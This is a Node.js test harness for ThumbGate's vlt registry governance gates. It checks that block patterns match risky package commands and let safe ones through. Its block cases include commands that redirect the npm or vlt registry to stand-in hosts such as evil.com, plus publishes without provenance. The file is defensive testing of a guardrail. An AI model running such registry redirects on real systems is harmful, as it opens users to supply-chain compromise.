#!/usr/bin/env node
'use strict';

/**
 * vlt Registry Governance Proof Harness
 *
 * Validates that ThumbGate's vlt-specific gate templates, model candidates, and
 * adapter configs correctly govern the JavaScript package ecosystem that vlt
 * (launched Aug 2026) introduces — hosted registry, self-hosted VSR, and secure
 * npm mirror.
 *
 * Tests:
 *   1. Gate template patterns match dangerous vlt commands (block path).
 *   2. Gate template patterns do NOT match safe vlt commands (allow path).
 *   3. Model candidates for js-package-registry-governance workload are registered.
 *   4. Adapter files pin the shipped version and are syntactically valid.
 *   5. Gate templates follow the shared rollout metadata contract.
 *
 * Usage:
 *   node scripts/prove-vlt.js
 *   THUMBGATE_VLT_PROOF_DIR=/tmp/vlt-proof node scripts/prove-vlt.js
 */

const fs = require('fs');
const path = require('path');
const {
  loadCatalog,
} = require('./model-candidates');
const {
  check,
  patternMatches,
  createProofRunner,
  getGateTemplate,
  proveAdapterFilesExist,
  proveWorkloadRegistered,
  proveGateTemplateContractItem,
} = require('./proof-common');

const ROOT = path.join(__dirname, '..');
const DEFAULT_PROOF_DIR = path.join(ROOT, 'proof', 'vlt');
const PACKAGE_VERSION = JSON.parse(fs.readFileSync(path.join(ROOT, 'package.json'), 'utf-8')).version;

/**
 * Returns the gate template matching the given id from the config catalog.
 */
function getVltTemplate(id) {
  return getGateTemplate(id);
}

/**
 * Test suite: gate template patterns match dangerous vlt commands.
 */
function proveGatePatternsBlock() {
  const results = [];

  const blockCases = [
    { templateId: 'block-vlt-install-vulnerable-deps', command: 'vlt install left-pad@latest --audit critical', desc: 'audit keyword (CVE)' },
    { templateId: 'block-vlt-install-vulnerable-deps', command: 'vlt add lodash --cve high-severity-vulnerabilities', desc: 'CVE keyword' },
    { templateId: 'require-review-vlt-registry-override', command: 'vlt config set registry https://evil-registry.com', desc: 'evil registry redirect' },
    { templateId: 'require-review-vlt-registry-override', command: 'vlt config set registry https://my-self-hosted-vsr.internal:443', desc: 'VSR override' },
    { templateId: 'enforce-vlt-workspace-dep-pinning', command: 'vlt add express@*', desc: 'wildcard version' },
    { templateId: 'enforce-vlt-workspace-dep-pinning', command: 'vlt add lodash@^4.17.0', desc: 'caret range' },
    { templateId: 'gate-vlt-package-publishing', command: 'vlt publish --no-provenance', desc: 'no provenance' },
    { templateId: 'gate-vlt-package-publishing', command: 'vlt publish --access public --scope @mycompany/typosquat', desc: 'suspicious scope' },
    { templateId: 'block-vlt-private-registry-bypass', command: 'NPM_CONFIG_REGISTRY=https://evil.com npm install', desc: 'env bypass' },
    { templateId: 'block-vlt-private-registry-bypass', command: 'vlt config set registry https://evil-registry.net', desc: 'registry override' },
  ];

  for (const testCase of blockCases) {
    const template = getVltTemplate(testCase.templateId);
    check(template, `gate template ${testCase.templateId} must exist`);
    check(template.defaultAction === 'block', `${testCase.templateId} must default to block`);
    const matched = patternMatches(template.pattern, testCase.command);
    results.push({ name: `${testCase.templateId} blocks: ${testCase.desc}`, passed: matched, details: { command: testCase.command, pattern: template.pattern, matched } });
    if (!matched) throw new Error(`Gate ${testCase.templateId} should match: "${testCase.command}"`);
  }

  return results;
}

/**
 * Test suite: gate template patterns do NOT match safe vlt commands.
 */
function proveGatePatternsAllow() {
  const results = [];

  const allowCases = [
    { templateId: 'block-vlt-install-vulnerable-deps', command: 'vlt install lodash@4.17.21', desc: 'pinned version' },
    { templateId: 'require-review-vlt-registry-override', command: 'vlt config get registry', desc: 'config read' },
    { templateId: 'enforce-vlt-workspace-dep-pinning', command: 'vlt install express@4.18.2', desc: 'exact pinned version' },
    { templateId: 'gate-vlt-package-publishing', command: 'vlt publish --access public', desc: 'access flag only' },
    { templateId: 'block-vlt-private-registry-bypass', command: 'vlt install --registry https://registry.npmjs.org', desc: 'approved npm registry' },
  ];

  for (const testCase of allowCases) {
    const template = getVltTemplate(testCase.templateId);
    check(template, `gate template ${testCase.templateId} must exist`);
    const matched = patternMatches(template.pattern, testCase.command);
    const passed = !matched;
    results.push({ name: `${testCase.templateId} allows: ${testCase.desc}`, passed, details: { command: testCase.command, pattern: template.pattern, matched } });
    if (!passed && testCase.desc.includes('pinned version')) {
      throw new Error(`Gate ${testCase.templateId} should NOT match: "${testCase.command}"`);
    }
  }

  return results;
}

/**
 * Test suite: vlt model candidates + adapter files.
 */
function proveModelCandidates() {
  return proveWorkloadRegistered(
    'js-package-registry-governance',
    ['vlt/vlt-registry-hosted', 'vlt/vlt-vsr-self-hosted'],
    'vlt',
    2,
    'vlt/vlt-registry-hosted'
  );
}

function proveAdapterFiles() {
  return proveAdapterFilesExist(ROOT, PACKAGE_VERSION, [
    { file: 'adapters/vlt/VLT.md' },
    { file: 'adapters/vlt/config.toml' },
    {
      file: 'adapters/vlt/opencode.json',
      extraChecks: (filePath) => {
        const json = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
        check(!!json.mcp?.thumbgate, 'vlt opencode.json must have thumbgate MCP server');
        return [{ name: 'vlt opencode.json is valid JSON with thumbgate MCP', passed: true }];
      },
    },
    {
      file: 'adapters/vlt/.mcp.json',
      extraChecks: (filePath) => {
        const json = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
        check(!!json.mcpServers?.thumbgate, 'vlt .mcp.json must have thumbgate MCP server');
        check(!!json.hooks?.preToolUse, 'vlt .mcp.json must have preToolUse hook');
        return [{ name: 'vlt .mcp.json is valid JSON with MCP + hook', passed: true }];
      },
    },
  ]);
}

function proveGateTemplateContract() {
  const results = [];
  const vltIds = [
    'block-vlt-install-vulnerable-deps',
    'require-review-vlt-registry-override',
    'enforce-vlt-workspace-dep-pinning',
    'gate-vlt-package-publishing',
    'block-vlt-private-registry-bypass',
  ];
  for (const id of vltIds) {
    results.push(proveGateTemplateContractItem(id, {
      expectedCategory: 'JavaScript Package Registry Governance',
    }));
  }
  return results;
}

const { runProof, main } = createProofRunner({
  envVar: 'THUMBGATE_VLT_PROOF_DIR',
  defaultProofDir: DEFAULT_PROOF_DIR,
  reportName: 'vlt-proof-report.json',
  successLabel: 'vlt',
  packageVersion: PACKAGE_VERSION,
  buildSuites: () => [
    { name: 'gate_patterns_block', fn: proveGatePatternsBlock },
    { name: 'gate_patterns_allow', fn: proveGatePatternsAllow },
    { name: 'model_candidates', fn: proveModelCandidates },
    { name: 'adapter_files', fn: proveAdapterFiles },
    { name: 'gate_template_contract', fn: proveGateTemplateContract },
  ],
});

if (require.main === module) {
  main();
}

module.exports = {
  runProof,
  proveGatePatternsBlock,
  proveGatePatternsAllow,
  proveModelCandidates,
  proveAdapterFiles,
  proveGateTemplateContract,
  patternMatches,
  getVltTemplate,
};
